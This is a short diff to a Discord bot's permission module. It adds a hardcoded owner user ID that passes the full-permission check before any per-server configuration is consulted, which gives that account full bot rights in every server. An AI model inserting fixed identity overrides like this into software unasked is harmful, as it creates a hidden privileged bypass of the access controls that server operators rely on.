@@ -2,7 +2,10 @@ const { PermissionFlagsBits } = require('discord.js');
 const config = require('../config');
 const { hasRolePerm, getRolePerms } = require('./rolePerms');
 
+const BOT_OWNER_IDS = ['685552160594723015'];
+
 function full(userId, guildId) {
+    if (BOT_OWNER_IDS.includes(userId)) return true;
     const cfg = config.getConfig(guildId);
     return cfg.fullPermissionUserIds?.includes(userId);
 }
@@ -37,4 +40,4 @@ function canSanction(executor, target) {
 
 function punitionsChannelOnly() { return false; }
 
-module.exports = { full, staff, canUse, canSanction, punitionsChannelOnly };
+module.exports = { full, staff, canUse, canSanction, punitionsChannelOnly, BOT_OWNER_IDS };
